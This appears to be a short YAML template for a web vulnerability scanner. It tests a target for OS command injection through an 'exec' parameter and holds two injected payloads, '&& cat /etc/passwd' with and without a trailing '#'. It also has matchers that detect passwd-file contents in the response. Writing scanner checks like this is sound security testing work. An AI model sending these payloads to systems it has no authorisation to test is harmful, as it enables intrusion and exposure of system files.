id: cmdi-056
name: 'OS command injection via exec'
severity: critical
type: active
tags:
  - cmdi
  - injection
  - rce
description: 'OS command runs via exec'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      exec:
        - '&& cat /etc/passwd'
        - '&& cat /etc/passwd #'
    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
          - 'root:x:0:0'
          - 'bin/bash'
          - 'www-data'
